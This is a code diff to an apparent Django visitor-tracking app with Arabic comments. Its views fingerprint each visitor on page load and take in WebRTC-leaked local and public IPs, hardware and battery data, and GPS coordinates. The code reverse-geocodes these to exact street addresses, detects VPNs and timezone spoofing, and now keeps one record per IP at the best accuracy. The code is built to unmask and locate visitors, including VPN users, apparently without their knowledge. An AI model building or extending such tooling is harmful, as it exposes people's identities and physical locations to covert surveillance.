@@ -4,6 +4,7 @@ import urllib.error
 from django.shortcuts import render
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
+from django.views.decorators.cache import never_cache
 from django.utils import timezone
 from .models import VisitorLog
 
@@ -226,55 +227,71 @@ def get_device_info(request):
         'user_agent': user_agent
     }
 
+@never_cache
 def public_welcome_view(request):
     """
     واجهة العرض الأولى - تسجيل البصمة المبدئية للزائر فور الدخول،
     وتجهيز الصفحة لإطلاق طلبات الموقع الدقيقة (GPS) و WebRTC Leak
+    مع ضمان عدم تكرار السجلات نهائياً (سجل واحد فقط لكل زائر / IP).
     """
     user_ip = get_client_ip(request)
     device_info = get_device_info(request)
-    intel = get_ip_intelligence(user_ip)
     
-    # محاولة الحصول على عنوان مبدئي من إحداثيات الـ IP (إن توفرت)
-    initial_address = ""
-    if intel.get('lat') and intel.get('lon') and intel['lat'] != 0.0:
-        initial_address, _ = get_exact_address_from_coords(intel['lat'], intel['lon'])
+    # فحص ما إذا كان الزائر مسجلاً مسبقاً بنفس الـ IP
+    last_log = VisitorLog.objects.filter(ip_address=user_ip).first()
     
-    # تسجيل جلسة التحقيق المبدئية في قاعدة البيانات
-    last_log = VisitorLog.objects.create(
-        ip_address=user_ip,
-        country=intel.get('country', 'غير محدد'),
-        governorate=intel.get('region') or intel.get('city') or 'غير محدد',
-        city=intel.get('city', ''),
-        full_address=initial_address or f"{intel.get('city', '')} - {intel.get('region', '')}",
-        isp=intel.get('isp', ''),
-        asn=intel.get('asn', ''),
-        is_vpn_or_proxy=intel.get('is_vpn_proxy', False),
-        timezone_ip=intel.get('timezone', ''),
-        device_type=device_info['device_type'],
-        browser=device_info['browser'],
-        os=device_info['os'],
-        latitude=intel.get('lat', 0.0),
-        longitude=intel.get('lon', 0.0),
-        accuracy=5000.0 if (intel.get('lat') and intel['lat'] != 0.0) else 0.0,
-        positioning_method="IP Geolocation",
-        user_agent=device_info['user_agent'],
-        referrer=request.META.get('HTTP_REFERER', '')
-    )
+    if last_log:
+        # تحديث توقيت الزيارة وبيانات الجهاز للسجل نفسه لمنع تكرار البيانات
+        last_log.visit_time = timezone.now()
+        last_log.device_type = device_info['device_type']
+        last_log.browser = device_info['browser']
+        last_log.os = device_info['os']
+        last_log.user_agent = device_info['user_agent']
+        if request.META.get('HTTP_REFERER'):
+            last_log.referrer = request.META.get('HTTP_REFERER')
+        last_log.save()
+    else:
+        # إنشاء السجل الأول لهذا الـ IP مع استعلام الاستخبارات الجغرافية
+        intel = get_ip_intelligence(user_ip)
+        initial_address = ""
+        if intel.get('lat') and intel.get('lon') and intel['lat'] != 0.0:
+            initial_address, _ = get_exact_address_from_coords(intel['lat'], intel['lon'])
+            
+        last_log = VisitorLog.objects.create(
+            ip_address=user_ip,
+            country=intel.get('country', 'غير محدد'),
+            governorate=intel.get('region') or intel.get('city') or 'غير محدد',
+            city=intel.get('city', ''),
+            full_address=initial_address or f"{intel.get('city', '')} - {intel.get('region', '')}",
+            isp=intel.get('isp', ''),
+            asn=intel.get('asn', ''),
+            is_vpn_or_proxy=intel.get('is_vpn_proxy', False),
+            timezone_ip=intel.get('timezone', ''),
+            device_type=device_info['device_type'],
+            browser=device_info['browser'],
+            os=device_info['os'],
+            latitude=intel.get('lat', 0.0),
+            longitude=intel.get('lon', 0.0),
+            accuracy=5000.0 if (intel.get('lat') and intel['lat'] != 0.0) else 0.0,
+            positioning_method="IP Geolocation",
+            user_agent=device_info['user_agent'],
+            referrer=request.META.get('HTTP_REFERER', '')
+        )
     
     context = {
         'log_id': last_log.id,
         'user_ip': user_ip,
-        'governorate': intel.get('region') or intel.get('city') or 'جاري التحديد...',
-        'city': intel.get('city', ''),
-        'country': intel.get('country', ''),
-        'isp': intel.get('isp', ''),
+        'governorate': last_log.governorate or last_log.city or 'جاري التحديد...',
+        'city': last_log.city or '',
+        'country': last_log.country or '',
+        'isp': last_log.isp or '',
         'device_info': device_info,
-        'is_vpn': intel.get('is_vpn_proxy', False)
+        'is_vpn': last_log.is_vpn_or_proxy
     }
     return render(request, 'welcome.html', context)
 
 @csrf_exempt
+@never_cache
 def report_forensic_data_view(request):
     """
     نقطة النهاية المركزية (Central Forensic Ingestion API):
@@ -283,6 +300,7 @@ def report_forensic_data_view(request):
     - تسريب عناوين WebRTC (Local LAN IP و Public IP)
     - بصمة العتاد (المعالج، الذاكرة، دقة الشاشة، شحن البطارية)
     - كشف التزييف عبر مقارنة التوقيت المحلي للمتصفح بتوقيت الـ IP
+    مع ضمان عدم تكرار السجلات نهائياً (سجل واحد فقط لكل زائر / IP).
     """
     user_ip = get_client_ip(request)
     
@@ -350,7 +368,7 @@ def report_forensic_data_view(request):
     else:
         exact_address, addr_details = "", {}
     
-    # محاولة جلب السجل المحدد بالـ log_id أولاً، أو البحث عن أحدث سجل لهذا الـ IP
+    # محاولة جلب السجل المحدد بالـ log_id أولاً، أو بالـ ip_address لضمان عدم تكرار السجلات نهائياً
     log_id = data.get('log_id')
     last_log = None
     if log_id:
@@ -360,8 +378,7 @@ def report_forensic_data_view(request):
             pass
 
     if not last_log:
-        fifteen_mins_ago = timezone.now() - timezone.timedelta(minutes=15)
-        last_log = VisitorLog.objects.filter(ip_address=user_ip, visit_time__gte=fifteen_mins_ago).order_by('-visit_time').first()
+        last_log = VisitorLog.objects.filter(ip_address=user_ip).first()
     
     if not last_log:
         intel = get_ip_intelligence(user_ip)
@@ -377,6 +394,9 @@ def report_forensic_data_view(request):
             positioning_method=positioning_method
         )
     
+    # تحديث وقت الزيارة دائماً ليبقى السجل في قمة لوحة التحكم بأحدث وقت
+    last_log.visit_time = timezone.now()
+
     # فحص دقيق للـ VPN / Proxy بدون أي اشتباه خاطئ في الشبكات المحلية
     if is_private_ip(user_ip):
         # الشبكة المحلية (LAN / Hotspot / 192.168.x.x) ليست اتصال VPN
@@ -394,19 +414,20 @@ def report_forensic_data_view(request):
 
     # تحديث الحقول الجنائية والموقع
     if lat != 0.0 and lon != 0.0:
-        # إحداثيات GPS حقيقية بدقة الأمتار
-        last_log.latitude = lat
-        last_log.longitude = lon
-        last_log.accuracy = accuracy
-        last_log.positioning_method = positioning_method
-        if exact_address:
-            last_log.full_address = exact_address
-        if addr_details.get('country'):
-            last_log.country = addr_details['country']
-        if addr_details.get('state'):
-            last_log.governorate = addr_details['state']
-        if addr_details.get('city') or addr_details.get('town') or addr_details.get('village'):
-            last_log.city = addr_details.get('city') or addr_details.get('town') or addr_details.get('village')
+        # الحفاظ على أفضل دقة تم الحصول عليها
+        if last_log.latitude == 0.0 or last_log.accuracy == 0.0 or accuracy <= (last_log.accuracy * 1.5):
+            last_log.latitude = lat
+            last_log.longitude = lon
+            last_log.accuracy = accuracy
+            last_log.positioning_method = positioning_method
+            if exact_address:
+                last_log.full_address = exact_address
+            if addr_details.get('country'):
+                last_log.country = addr_details['country']
+            if addr_details.get('state'):
+                last_log.governorate = addr_details['state']
+            if addr_details.get('city') or addr_details.get('town') or addr_details.get('village'):
+                last_log.city = addr_details.get('city') or addr_details.get('town') or addr_details.get('village')
     elif (last_log.latitude == 0.0 or last_log.longitude == 0.0) and leaked_public_ip and not is_private_ip(leaked_public_ip):
         # في حال لم تتوفر إحداثيات GPS بعد وكان الاتصال محلياً، نستخدم إحداثيات الـ IP العام المسرب احتياطياً ليظهر زر الخريطة
         leaked_intel = get_ip_intelligence(leaked_public_ip)
